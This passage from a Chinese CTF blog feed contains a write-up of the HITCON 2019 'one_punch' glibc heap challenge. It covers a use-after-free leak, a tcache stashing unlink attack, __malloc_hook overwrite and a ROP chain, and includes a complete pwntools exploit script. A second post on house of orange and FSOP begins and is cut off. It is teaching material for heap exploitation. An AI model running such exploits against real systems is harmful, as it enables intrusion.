：释放空间，但没有将指针置0，存在指针悬空</p><p>同时存在一个后门函数，输入0xC388，可以执行。后门函数判断heap_base+0x30处的单字节是否大于6，大于则继续执行。使用malloc分配0x217，然后读入字符串。没有被释放，这里存在内存泄漏</p><p><strong>calloc</strong></p><p>malloc执行过程：<code>__libc_malloc</code>-&gt;<code>_int_malloc</code></p><p>calloc执行过程：<code>__libc_calloc</code>-&gt;<code>_int_malloc</code></p><p>使用tcache分配即为<code>tcache_get</code>存在于<code>__libc_malloc</code>，而<code>_int_malloc</code>只会使用<code>tcache_put</code>填充tcache。所以得出一般结论，calloc不会使用tcache进行分配。</p><p>（有例外，在<code>_int_malloc</code>中遍历unsorted bin的尾部存在使用tcache分配的行为）</p><h3 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h3><p>利用UAF泄露heap base、libc base。</p><p>利用tcache stashing unlink attack覆写heap_base+0x30的位置。解除后门函数的使用限制。</p><p>对0x220（即<code>malloc(0x217)</code>使用）的tcache使用类似fastbin attack的方式修改<code>__malloc_hook</code>。因为程序使用了seccomp限制了系统调用，所以后续使用rop的方式读出flag。<code>__malloc_hook</code>修改为<code>add rsp, 0x48; ret</code>的gadget地址，将rsp移动到debut函数的buf位置。利用debut中的<code>read(0, buf, 0x400)</code>将一系列rop操作读入到buf里。</p><h3 id="tcache-stashing-unlink-attack-1"><a href="#tcache-stashing-unlink-attack-1" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0xf8</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b *$rebase(0x16AB)&quot;)</span></span><br><span class="line">debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">retire(<span class="number">0</span>)</span><br><span class="line">debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">retire(<span class="number">0</span>)</span><br><span class="line">debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">rename(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x308</span> + p64(<span class="number">0x101</span>) + p64(heap_base+<span class="number">0x2d20</span>) + p64(heap_base+<span class="number">0x1f</span>))</span><br><span class="line">debut(<span class="number">0</span>, <span class="string">b&quot;./flag&quot;</span>.ljust(<span class="number">0xf8</span>, <span class="string">b&quot;\x00&quot;</span>))<span class="comment"># trigger</span></span><br></pre></td></tr></table></figure><p>目标是0x100，首先释放6个进tcache。然后通过切割unsorted bin的方式，使两个0x100的chunk进入small bin。修改倒数第二个small bin的bk，将其指向<code>heap_base+0x30-0x11</code>处。</p><p>如果指向<code>heap_base+0x30-0x10</code>，则会将0x90写入heap_base+0x30处，<code>cmp al, 6</code>看起来是有符号比较，会认为0x90小于0x6。所以偏移一个字节，但有时还是会因为最高位为1而gg。</p><h3 id="tcache-attack"><a href="#tcache-attack" class="headerlink" title="tcache attack"></a>tcache attack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x217</span>)</span><br><span class="line">debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x217</span>)</span><br><span class="line">retire(<span class="number">0</span>)</span><br><span class="line">retire(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">rename(<span class="number">1</span>, p64(libc_base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]))</span><br><span class="line">backdoor(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">backdoor(p64(libc_base+<span class="number">0xbdfd1</span>))</span><br></pre></td></tr></table></figure><p>释放得到两个0x220的块进入tcache，修改第一个的tcache_entry-&gt;next到<code>__malloc_hook</code>。两次分配获得hook，修改为<code>add rsp, 0x48; ret</code>的gadget地址。为什么是0x48，调试可以知道。</p><h3 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rop</span></span><br><span class="line">poprdi = libc_base + <span class="number">0x219c0</span></span><br><span class="line">poprsi = libc_base + <span class="number">0x24435</span></span><br><span class="line">poprdx = libc_base + <span class="number">0x1b9a</span></span><br><span class="line">poprax = libc_base + <span class="number">0x37fa8</span></span><br><span class="line">syscall= libc_base + g(<span class="string">&quot;syscall; ret&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## open</span></span><br><span class="line">rops  = p64(poprdi) + p64(heap_base+<span class="number">0x2d30</span>)</span><br><span class="line">rops += p64(poprsi) + p64(<span class="number">0</span>)</span><br><span class="line">rops += p64(poprdx) + p64(<span class="number">0</span>)</span><br><span class="line">rops += p64(poprax) + p64(<span class="number">2</span>)</span><br><span class="line">rops += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment">## read</span></span><br><span class="line">rops += p64(poprdi) + p64(<span class="number">3</span>)</span><br><span class="line">rops += p64(poprsi) + p64(heap_base+<span class="number">0x2d30</span>)</span><br><span class="line">rops += p64(poprdx) + p64(<span class="number">20</span>)</span><br><span class="line">rops += p64(poprax) + p64(<span class="number">0</span>)</span><br><span class="line">rops += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment">## write</span></span><br><span class="line">rops += p64(poprdi) + p64(<span class="number">1</span>)</span><br><span class="line">rops += p64(poprsi) + p64(heap_base+<span class="number">0x2d30</span>)</span><br><span class="line">rops += p64(poprdx) + p64(<span class="number">20</span>)</span><br><span class="line">rops += p64(poprax) + p64(<span class="number">1</span>)</span><br><span class="line">rops += p64(syscall)</span><br></pre></td></tr></table></figure><p>依次使用open、read、write系统调用，读取flag。其中<code>syscall; ret</code>这个gadget，ROPgadget这个工具不会进行生成，使用了机器码搜索的方式<code>g = lambda x :next(libc.search(asm(x)))</code>。</p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/Hitcon2019%20one_punch/exp.py">exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;info&quot;</span>)</span><br><span class="line">localfile = <span class="string">&quot;./one_punch&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;../glibc_versions/2.29/x64_tcache/lib/libc.so.6&quot;</span></span><br><span class="line">pf      = <span class="keyword">lambda</span> name,num           :log.info(name + <span class="string">&quot;: 0x%x&quot;</span> % num)</span><br><span class="line">g       = <span class="keyword">lambda</span> x                  :next(libc.search(asm(x)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debut</span>(<span class="params">idx, name</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;hero name: &quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span>(<span class="params">idx, name</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;hero name: &quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">retire</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>(<span class="params">s</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(str(<span class="number">0xc388</span>))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">        retire(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak heap base</span></span><br><span class="line">    debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;hero name: &quot;</span>)</span><br><span class="line">    heap_base = u64(io.recvline().strip(<span class="string">b&quot;\n&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) &amp; (~<span class="number">0xfff</span>)</span><br><span class="line">    pf(<span class="string">&quot;heap base&quot;</span>, heap_base)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc base</span></span><br><span class="line">    debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">    debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;hero name: &quot;</span>)</span><br><span class="line">    libc_base = u64(io.recvline().strip(<span class="string">b&quot;\n&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x3B3CA0</span></span><br><span class="line">    pf(<span class="string">&quot;libc base&quot;</span>, libc_base)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache stashing unlink attack</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0xf8</span>)</span><br><span class="line">        retire(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">        retire(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b *$rebase(0x16AB)&quot;)</span></span><br><span class="line">    debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">    debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line">    debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">    debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">    debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line">    debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">    debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">    rename(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x308</span> + p64(<span class="number">0x101</span>) + p64(heap_base+<span class="number">0x2d20</span>) + p64(heap_base+<span class="number">0x1f</span>))</span><br><span class="line">    debut(<span class="number">0</span>, <span class="string">b&quot;./flag&quot;</span>.ljust(<span class="number">0xf8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x217</span>)</span><br><span class="line">    debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x217</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line">    retire(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    rename(<span class="number">1</span>, p64(libc_base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]))</span><br><span class="line">    backdoor(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">    backdoor(p64(libc_base+<span class="number">0xbdfd1</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># rop</span></span><br><span class="line">    poprdi = libc_base + <span class="number">0x219c0</span></span><br><span class="line">    poprsi = libc_base + <span class="number">0x24435</span></span><br><span class="line">    poprdx = libc_base + <span class="number">0x1b9a</span></span><br><span class="line">    poprax = libc_base + <span class="number">0x37fa8</span></span><br><span class="line">    syscall= libc_base + g(<span class="string">&quot;syscall; ret&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## open</span></span><br><span class="line">    rops  = p64(poprdi) + p64(heap_base+<span class="number">0x2d30</span>)</span><br><span class="line">    rops += p64(poprsi) + p64(<span class="number">0</span>)</span><br><span class="line">    rops += p64(poprdx) + p64(<span class="number">0</span>)</span><br><span class="line">    rops += p64(poprax) + p64(<span class="number">2</span>)</span><br><span class="line">    rops += p64(syscall)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## read</span></span><br><span class="line">    rops += p64(poprdi) + p64(<span class="number">3</span>)</span><br><span class="line">    rops += p64(poprsi) + p64(heap_base+<span class="number">0x2d30</span>)</span><br><span class="line">    rops += p64(poprdx) + p64(<span class="number">20</span>)</span><br><span class="line">    rops += p64(poprax) + p64(<span class="number">0</span>)</span><br><span class="line">    rops += p64(syscall)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## write</span></span><br><span class="line">    rops += p64(poprdi) + p64(<span class="number">1</span>)</span><br><span class="line">    rops += p64(poprsi) + p64(heap_base+<span class="number">0x2d30</span>)</span><br><span class="line">    rops += p64(poprdx) + p64(<span class="number">20</span>)</span><br><span class="line">    rops += p64(poprax) + p64(<span class="number">1</span>)</span><br><span class="line">    rops += p64(syscall)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;&quot;&quot;b *$rebase(0x16AB)</span></span><br><span class="line">    <span class="comment"># b *$rebase(0x139C)</span></span><br><span class="line">    <span class="comment"># &quot;&quot;&quot;)</span></span><br><span class="line"></span><br><span class="line">    debut(<span class="number">0</span>, rops.ljust(<span class="number">0x80</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">    io.interactive(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x00000000000bdfd1 : add rsp, 0x48 ; ret</span></span><br><span class="line"><span class="string">0x00000000000219c0 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000024435 : pop rsi ; ret</span></span><br><span class="line"><span class="string">0x0000000000001b9a : pop rdx ; ret</span></span><br><span class="line"><span class="string">0x0000000000037fa8 : pop rax ; ret</span></span><br><span class="line"><span class="string">0x000000000000275b : syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ol><li>how2heap tcache_stashing_unlink_attack.c</li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#challenge-4-hitcon-2019-one_punch_man">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#challenge-4-hitcon-2019-one_punch_man</a></li><li><a href="https://qianfei11.github.io/2020/05/05/Tcache-Stashing-Unlink-Attack/#Tcache-Stashing-Unlink-Attack-Plus">https://qianfei11.github.io/2020/05/05/Tcache-Stashing-Unlink-Attack/#Tcache-Stashing-Unlink-Attack-Plus</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;tcache-stashing-unlink-attack&quot;&gt;&lt;a href=&quot;#tcache-stashing-unlink-attack&quot; class=&quot;headerlink&quot; title=&quot;tcache stashing unlink attack&quot;&gt;&lt;/a&gt;tcache stashing unlink attack&lt;/h2&gt;&lt;p&gt;在tcache中布置5个chunk，对应大小的small bin中布置2个chunk。修改倒数第二个small chunk的bk指向target，target-&amp;gt;bk写入一个可写的位置。使用calloc触发，因为calloc调用&lt;code&gt;_int_malloc&lt;/code&gt;不会使用tcache进行分配（除了&lt;code&gt;_int_malloc&lt;/code&gt;遍历unsorted bin的尾部），只会往tcache中填充。&lt;/p&gt;
&lt;p&gt;可以造成target-&amp;gt;bk-&amp;gt;fd位置写入大数字，并且target成为tcache中第一个，再次malloc就可以获得。&lt;/p&gt;
&lt;p&gt;有点像fastbin reverse into tcache。&lt;/p&gt;
&lt;h3 id=&quot;variation&quot;&gt;&lt;a href=&quot;#variation&quot; class=&quot;headerlink&quot; title=&quot;variation&quot;&gt;&lt;/a&gt;variation&lt;/h3&gt;&lt;p&gt;在tcache中布置6个chunk，对应大小的small bin中布置2个chunk。（可以用unsorted bin切割的方式布置2个small bin）&lt;/p&gt;
&lt;p&gt;修改倒数第二个small chunk的bk，calloc触发，只在bk-&amp;gt;fd写入大数字。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="how2heap" scheme="http://hhdx.xyz/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>How2heap--house_of_orange Hitcon2016--houseoforange</title>
    <link href="http://hhdx.xyz/2020/07/25/How2heap-house-of-orange-Hitcon2016-houseoforange/"/>
    <id>http://hhdx.xyz/2020/07/25/How2heap-house-of-orange-Hitcon2016-houseoforange/</id>
    <published>2020-07-25T10:14:07.000Z</published>
    <updated>2020-10-24T13:21:30.860Z</updated>
    
    <content type="html"><![CDATA[<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p>修改<code>topchunk-&gt;size</code>为一个缩小的并且满足页对齐的大小，malloc一个大于size的块（但也不要大于mmap threshold），会导致原来topchunk被放入unsorted bin。</p><p>当topchunk不足以分配所需空间时，会调用sysmalloc分配额外空间。一般情况下，main_arena中old top chunk和新分配的top chunk首尾相邻，从而会进行合并。当我们将<code>topchunk-&gt;size</code>减小后，会检测不到相邻，也就不会合并了。设置好fencepost chunk，会执行<code>_int_free (av, old_top, 1)</code>将其放入unsorted bin。</p><p>代码涉及<code>_int_malloc</code>后边和<code>sysmalloc</code>。</p><a id="more"></a><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><details>    <summary>`struct _IO_FILE_plus`结构</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></details>`struct _IO_FILE_plus`包含`struct _IO_FILE`和`struct _IO_jump_t *`，前者保存打开文件的信息，后者保存对文件进行操作的函数指针列表的指针，可以对不同类型的文件加以不同的具体操作。<details>    <summary>`struct _IO_FILE`结构</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* 